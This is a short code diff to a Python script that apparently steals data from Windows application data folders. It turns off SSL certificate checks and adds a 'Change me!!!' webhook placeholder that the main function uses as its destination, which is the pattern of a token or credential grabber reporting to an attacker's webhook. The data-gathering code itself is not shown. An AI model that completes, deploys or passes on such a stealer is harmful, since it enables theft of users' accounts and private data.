@@ -8,6 +8,8 @@ from urllib.request import Request, urlopen
 import ssl
 ssl._create_default_https_context = ssl._create_unverified_context
 
+WEBHOOK = "ADD_WEBHOOK" #Change me!!!
+
 if os.name == "nt":
     LOCAL = os.getenv("LOCALAPPDATA")
     ROAMING = os.getenv("APPDATA")
@@ -165,4 +167,4 @@ def main(WEBHOOK_URL):
 
 
 if __name__ == "__main__":
-    main("WEBHOOK_URL")
+    main(WEBHOOK)
